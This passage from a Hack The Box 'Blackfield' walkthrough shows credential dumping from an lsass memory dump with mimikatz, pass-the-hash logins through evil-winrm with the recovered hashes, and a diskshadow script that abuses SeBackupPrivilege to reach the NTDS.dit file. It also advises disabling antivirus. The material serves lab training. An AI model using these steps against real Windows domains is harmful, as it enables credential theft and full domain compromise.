</pre></table></code></div></div><p>Now i can head towards the <code class="language-plaintext highlighter-rouge">/mnt</code> dir for sure</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>âžœ  /mnt <span class="nb">ls
</span>commands_output  memory_analysis  tools
âžœ  /mnt 
</pre></table></code></div></div><p>and now i can copy the zip file from here</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>âžœ  memory_analysis <span class="nb">cp </span>lsass.zip /home/prashant/
</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">unzipping the file</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>âžœ  prashant unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP               
âžœ  prashant 
</pre></table></code></div></div><p>Well <code class="language-plaintext highlighter-rouge">.DMP</code> file is a memory dump file which been created when the program crahses or something went wrongâ€¦.</p><p>It can be sometime useful to dump useful <code class="language-plaintext highlighter-rouge">information</code> from it , Thats why <code class="language-plaintext highlighter-rouge">mimikatz</code> has a feature to dump useful information from it like , <strong>NTLM</strong> hash</p><p>i copied the <code class="language-plaintext highlighter-rouge">.DMP</code> file to my windows machine and Download mimikatz in it</p><blockquote><p>Disable the <code class="language-plaintext highlighter-rouge">virus-protection</code> from windows to download mimikatz</p></blockquote><blockquote><p><a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf" target="_blank">https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf</a></p></blockquote><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank">https://github.com/gentilkiwi/mimikatz/releases</a></p></blockquote><p>Load your <code class="language-plaintext highlighter-rouge">mimikatz.exe</code></p><p><a href="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-1.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-1.png" alt="mimikatz" /></a></p><blockquote><p>sekurlsa::minidump /users/0xPrashant/Desktop/lsass.DMP</p></blockquote><p><a href="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-2.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-2.png" alt="mimikatz" /></a></p><blockquote><p>sekurlsa::LogonPasswords</p></blockquote><p><a href="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-3.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/blackfield/b13289a1-d042-4fa2-b5b5-1a2e2a78cc54/image-3.png" alt="mimikatz" /></a></p><p>And done !! i got basically two users hash</p><ul><li><code class="language-plaintext highlighter-rouge">svc_backup</code><li><code class="language-plaintext highlighter-rouge">administrator</code></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre>Opening : <span class="s1">'/users/0xPrashant/Desktop/lsass.DMP'</span> file <span class="k">for </span>minidump...

Authentication Id : 0 <span class="p">;</span> 406458 <span class="o">(</span>00000000:000633ba<span class="o">)</span>
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 23-02-2020 23:30:03
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         <span class="o">[</span>00000003] Primary
         <span class="k">*</span> Username : svc_backup
         <span class="k">*</span> Domain   : BLACKFIELD
         <span class="k">*</span> NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         <span class="k">*</span> SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         <span class="k">*</span> DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         <span class="k">*</span> Username : svc_backup
         <span class="k">*</span> Domain   : BLACKFIELD
         <span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
        kerberos :
         <span class="k">*</span> Username : svc_backup
         <span class="k">*</span> Domain   : BLACKFIELD.LOCAL
         <span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
        ssp :
        credman :


Authentication Id : 0 <span class="p">;</span> 153705 <span class="o">(</span>00000000:00025869<span class="o">)</span>
Session           : Interactive from 1
User Name         : Administrator
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 23-02-2020 23:29:04
SID               : S-1-5-21-4194615774-2175524697-3563712290-500
        msv :
         <span class="o">[</span>00000003] Primary
         <span class="k">*</span> Username : Administrator
         <span class="k">*</span> Domain   : BLACKFIELD
         <span class="k">*</span> NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         <span class="k">*</span> SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
         <span class="k">*</span> DPAPI    : 240339f898b6ac4ce3f34702e4a89550
        tspkg :
        wdigest :
         <span class="k">*</span> Username : Administrator
         <span class="k">*</span> Domain   : BLACKFIELD
         <span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
        kerberos :
         <span class="k">*</span> Username : Administrator
         <span class="k">*</span> Domain   : BLACKFIELD.LOCAL
         <span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
        ssp :
        credman :
</pre></table></code></div></div><p>There is a <code class="language-plaintext highlighter-rouge">administrator</code> <strong>NTLM</strong> hash but i dont think this will be that easy</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>âžœ  prashant evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> administrator <span class="nt">-H</span> 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of <span class="nb">type </span>WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

âžœ  prashant
</pre></table></code></div></div><p>As expected it didnt workâ€¦.move on</p><h1 id="login-as-svc_backup">Login as svc_backup</h1><p>I tried the second <code class="language-plaintext highlighter-rouge">NTLM</code> hash that is of svc_backup user</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">âžœ</span><span class="w">  </span><span class="nf">prashant</span><span class="w"> </span><span class="nx">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.10.192</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">svc_backup</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">9658d1d1dcd9250115e2205d9f48400d</span><span class="w">   

</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.3</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="nf">blackfield\svc_backup</span><span class="w">
</span></pre></table></code></div></div><h2 id="got-usertxt">Got user.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="mi">8</span><span class="nf">ac------------------------------bd</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Desktop</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege escalation to root</h1><p>Root is as simple as i didnt even thinkâ€¦.</p><blockquote><p>whoami /all</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="nf">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">----------------</span><span class="w">

</span><span class="nf">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">             </span><span class="nx">SID</span><span class="w">
</span><span class="o">=====================</span><span class="w"> </span><span class="o">==============================================</span><span class="w">
</span><span class="nf">blackfield\svc_backup</span><span class="w"> </span><span class="nx">S-1-5-21-4194615774-2175524697-3563712290-1413</span><span class="w">


</span><span class="nf">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">-----------------</span><span class="w">

</span><span class="nf">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                 </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
</span><span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
</span><span class="nf">Everyone</span><span class="w">                                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Backup</span><span class="w"> </span><span class="nx">Operators</span><span class="w">                   </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-551</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">            </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Users</span><span class="w">                              </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Pre-Windows</span><span class="w"> </span><span class="nx">2000</span><span class="w"> </span><span class="nx">Compatible</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-554</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">Mandatory</span><span class="w"> </span><span class="nx">Label\High</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w">       </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-12288</span><span class="w">


</span><span class="nf">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">----------------------</span><span class="w">

</span><span class="nf">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
</span><span class="nf">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeBackupPrivilege</span><span class="w">             </span><span class="nx">Back</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">  </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeRestorePrivilege</span><span class="w">            </span><span class="nx">Restore</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">  </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeShutdownPrivilege</span><span class="w">           </span><span class="nx">Shut</span><span class="w"> </span><span class="nx">down</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w">           </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">


</span><span class="nf">USER</span><span class="w"> </span><span class="nx">CLAIMS</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">-----------------------</span><span class="w">

</span><span class="nf">User</span><span class="w"> </span><span class="nx">claims</span><span class="w"> </span><span class="nx">unknown.</span><span class="w">

</span><span class="nf">Kerberos</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Dynamic</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">disabled.</span><span class="w">
</span></pre></table></code></div></div><p>As from the output these are some interesting ones which suits to the username <code class="language-plaintext highlighter-rouge">svc_backup</code>â€¦.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>BUILTIN<span class="se">\B</span>ackup Operators
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SeBackupPrivilege             Back up files and directories  Enabled
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">svc_backup</code> can backup the data since it has <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code></p><p>it took me some time actually that what to do but some google searches save my timeâ€¦.</p><p>Since it is a <code class="language-plaintext highlighter-rouge">AD</code> machine and i have perms to backup anyting from the machine , So i am going to backup the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file and the registry file <code class="language-plaintext highlighter-rouge">system</code></p><blockquote><p>The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.</p></blockquote><p>Here is a good explation from a pdf file that how it is going to work !!</p><blockquote><p><a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf" target="_blank">https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</a></p></blockquote><p>i need to use <code class="language-plaintext highlighter-rouge">diskshadow</code> to first make a new <strong>volume</strong> and <code class="language-plaintext highlighter-rouge">alias</code> it with the volume <code class="language-plaintext highlighter-rouge">C:</code> so i can read everything from the volume <strong>c:</strong></p><p>here i made a <code class="language-plaintext highlighter-rouge">text</code> file basically a script that will execute commands on the <strong>Diskshadow</strong> console</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>SET CONTEXT PERSISTENT NOWRITERS
add volume c: <span class="nb">alias </span>0xprashant
create
expose %0xprashant% z:
</pre></table></code></div></div><blockquote><p>Uploading the script</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">/home/prashant/0xprashant.txt</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Uploading</span><span class="w"> </span><span class="nx">/home/prashant/0xprashant.txt</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\temp\0xprashant.txt</span><span class="w">

                                                             
</span><span class="kr">Data</span><span class="p">:</span><span class="w"> </span><span class="mi">124</span><span class="w"> </span><span class="nf">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">124</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">copied</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Upload</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Executing the script</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">0xprashant.txt</span><span class="w">
</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">DiskShadow</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="mi">2013</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation</span><span class="w">
</span><span class="nf">On</span><span class="w"> </span><span class="nx">computer:</span><span class="w">  </span><span class="nx">DC01</span><span class="p">,</span><span class="w">  </span><span class="nx">6/10/2020</span><span class="w"> </span><span class="nx">3:34:37</span><span class="w"> </span><span class="nx">PM</span><span class="w">

</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">SET</span><span class="w"> </span><span class="nx">CONTEXT</span><span class="w"> </span><span class="nx">PERSISTENT</span><span class="w"> </span><span class="nx">NOWRITER</span><span class="w">

</span><span class="nf">SET</span><span class="w"> </span><span class="nx">CONTEXT</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nf">CLIENTACCESSIBLE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">PERSISTENT</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="kt">NOWRITERS</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">VOLATILE</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="kt">NOWRITERS</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">}</span><span class="w">

        </span><span class="nf">CLIENTACCESSIBLE</span><span class="w">        </span><span class="nx">Specify</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copies</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">versions</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">Windows.</span><span class="w">
        </span><span class="nf">PERSISTENT</span><span class="w">              </span><span class="nx">Specify</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">persist</span><span class="w"> </span><span class="nx">across</span><span class="w"> </span><span class="nx">program</span><span class="w"> </span><span class="nx">exit</span><span class="p">,</span><span class="w"> </span><span class="nx">reset</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">reboot.</span><span class="w">
        </span><span class="nf">PERSISTENT</span><span class="w"> </span><span class="nx">NOWRITERS</span><span class="w">    </span><span class="nx">Specify</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">persistent</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">writers</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">excluded.</span><span class="w">
        </span><span class="nf">VOLATILE</span><span class="w">                </span><span class="nx">Specify</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">deleted</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">exit</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">reset.</span><span class="w">
        </span><span class="nf">VOLATILE</span><span class="w"> </span><span class="nx">NOWRITERS</span><span class="w">      </span><span class="nx">Specify</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">volatile</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">writers</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">excluded.</span><span class="w">

        </span><span class="nf">Example:</span><span class="w"> </span><span class="nx">SET</span><span class="w"> </span><span class="nx">CONTEXT</span><span class="w"> </span><span class="nx">CLIENTACCESSIBLE</span><span class="w">
</span></pre></table></code></div></div><p>Got an error of like thisâ€¦..If i look at the error it is complaing about the <code class="language-plaintext highlighter-rouge">-&gt; SET CONTEXT PERSISTENT NOWRITER</code> but in my script it is <strong>NOWRITERS</strong> not <code class="language-plaintext highlighter-rouge">NOWRITER</code> .</p><p>Then i figured it out that the last character from the line is being delted and then its used</p><blockquote><p><strong>I added an extra dummy character at the last of every line</strong></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>âžœ  prashant <span class="nb">cat </span>0xprashant.txt 
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: <span class="nb">alias </span>0xprashantp
createp
expose %0xprashant% z:p
</pre></table></code></div></div><p>like thisâ€¦â€¦â€¦â€¦â€¦!!!!!!</p><blockquote><p>Running again</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">0xprashant.txt</span><span class="w">
</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">DiskShadow</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="mi">2013</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation</span><span class="w">
